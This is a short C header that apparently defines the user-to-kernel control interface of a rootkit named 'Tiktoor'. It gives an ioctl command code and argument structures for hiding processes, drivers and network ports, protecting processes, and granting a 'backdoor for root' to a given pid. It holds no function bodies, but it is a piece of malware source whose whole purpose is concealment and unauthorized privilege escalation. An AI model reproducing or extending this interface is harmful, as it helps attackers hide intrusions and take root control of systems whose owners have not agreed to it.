#define TIKTOOR_IOCTL_CMD 0xdeadbeaf

struct TiktoorCmdArg {
    unsigned char action;
    void *subargs;
};

struct ProcessHidingSubargs {
    unsigned int pid;
};

struct DriverHidingSubargs {
    const char* name;
};

struct PortHidingSubargs {
    unsigned char transmission_type;
    unsigned short port;
};

struct ProcessProtectingSubargs {
    unsigned int pid;
};

struct BackdoorForRootSubargs {
    unsigned int pid;
};
